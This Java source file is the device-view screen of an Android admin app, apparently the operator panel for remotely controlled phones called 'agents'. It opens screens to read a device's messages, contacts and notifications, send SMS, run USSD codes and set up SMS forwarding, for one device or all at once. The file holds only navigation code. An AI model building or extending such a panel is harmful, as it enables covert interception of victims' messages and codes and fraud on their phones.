package com.pegalite.neotronadmin.ui;

import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;

import com.pegalite.neotronadmin.databinding.ActivityViewDeviceBinding;
import com.pegalite.neotronadmin.functions.utils.Utils;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAnimationManager;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;

public class ViewDeviceActivity extends PegaAppCompatActivity {

    ActivityViewDeviceBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityViewDeviceBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();
        setBackWithRightAnim();

        binding.back.setOnClickListener(v -> getOnBackPressedDispatcher().onBackPressed());

        if (Utils.exp == null) {
            finishAffinity();
            return;
        }

        String agentID = getIntent().getStringExtra("agentID");
        if (agentID == null) {
            finish();
            return;
        }
        String deviceName = getIntent().getStringExtra("deviceName");
        binding.title.setText(deviceName);

        binding.messages.setOnClickListener(v -> {
            openActivityWithRightAnim(new Intent(this, MessagesActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });

        binding.contacts.setOnClickListener(v -> {
            if (agentID.equals("all")) {
                PegaAnimationManager.shake(binding.contacts);
                Toast.makeText(this, "This option cannot be used while controlling all agents together.", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, ContactsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });

        binding.sendMessage.setOnClickListener(v -> {
            if (agentID.equals("all")) {
                PegaAnimationManager.shake(binding.sendMessage);
                Toast.makeText(this, "This option cannot be used while controlling all agents together.", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, SendMessageActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.details.setOnClickListener(v -> {
            openActivityWithRightAnim(new Intent(this, ViewDetailsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.runUssdCode.setOnClickListener(v -> {
            if (agentID.equals("all")) {
                PegaAnimationManager.shake(binding.runUssdCode);
                Toast.makeText(this, "This option cannot be used while controlling all agents together.", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, RunUSSDCodeActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.notifications.setOnClickListener(v -> {
            openActivityWithRightAnim(new Intent(this, NotificationsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.addSMSForwarding.setOnClickListener(v -> {
            openActivityWithRightAnim(new Intent(this, SmsForwardingActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });


    }
}